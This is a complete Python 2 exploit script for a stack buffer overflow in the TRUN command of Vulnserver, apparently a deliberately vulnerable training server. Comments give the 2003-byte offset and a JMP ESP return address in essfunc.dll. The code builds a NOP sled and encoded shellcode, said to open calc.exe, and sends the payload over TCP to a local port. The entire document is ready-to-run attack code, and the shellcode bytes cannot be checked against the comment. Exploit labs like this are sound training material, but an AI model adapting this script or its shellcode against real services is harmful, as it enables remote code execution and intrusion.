#!/usr/bin/python
# Title: Vulnserver TRUN command

#-------------------------------------------------------------#
# --> overflowing the buffer:
# 1) reaching the instruction pointer after 2003 bytes;
# 2) overwriting the EIP with --> JMP ESP from essfunc.dll;
# 3) adding 16 nops for padding;
# 4) adding shellcode for calc.exe
#-------------------------------------------------------------#


import socket
import sys

shellcode = "\xda\xd9\xd9\x74\x24\xf4\x5a\xbb\x33\xf8\x0b\x8e\x2b\xc9\xb1"
shellcode += "\x31\x31\x5a\x18\x83\xea\xfc\x03\x5a\x27\x1a\xfe\x72\xaf\x58"
shellcode += "\x01\x8b\x2f\x3d\x8b\x6e\x1e\x7d\xef\xfb\x30\x4d\x7b\xa9\xbc"
shellcode += "\x26\x29\x5a\x37\x4a\xe6\x6d\xf0\xe1\xd0\x40\x01\x59\x20\xc2"
shellcode += "\x81\xa0\x75\x24\xb8\x6a\x88\x25\xfd\x97\x61\x77\x56\xd3\xd4"
shellcode += "\x68\xd3\xa9\xe4\x03\xaf\x3c\x6d\xf7\x67\x3e\x5c\xa6\xfc\x19"
shellcode += "\x7e\x48\xd1\x11\x37\x52\x36\x1f\x81\xe9\x8c\xeb\x10\x38\xdd"
shellcode += "\x14\xbe\x05\xd2\xe6\xbe\x42\xd4\x18\xb5\xba\x27\xa4\xce\x78"
shellcode += "\x5a\x72\x5a\x9b\xfc\xf1\xfc\x47\xfd\xd6\x9b\x0c\xf1\x93\xe8"
shellcode += "\x4b\x15\x25\x3c\xe0\x21\xae\xc3\x27\xa0\xf4\xe7\xe3\xe9\xaf"
shellcode += "\x86\xb2\x57\x01\xb6\xa5\x38\xfe\x12\xad\xd4\xeb\x2e\xec\xb2"
shellcode += "\xea\xbd\x8a\xf0\xed\xbd\x94\xa4\x85\x8c\x1f\x2b\xd1\x10\xca"
shellcode += "\x08\x2d\x5b\x57\x38\xa6\x02\x0d\x79\xab\xb4\xfb\xbd\xd2\x36"
shellcode += "\x0e\x3d\x21\x26\x7b\x38\x6d\xe0\x97\x30\xfe\x85\x97\xe7\xff"
shellcode += "\x8f\xfb\x66\x6c\x53\xd2\x0d\x14\xf6\x2a"


payload = b"A"*2003
payload += "\xaf\x11\x50\x62"   # 0x625011AF (jmp esp - essfunc.dll)
payload += "\x90"*16
payload += shellcode


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9999))
    print s.recv(1024)
    s.send("TRUN /.:/" + payload)
    print s.recv(1024)
    s.close()

except:
    print "[-] Connection error"
    sys.exit()
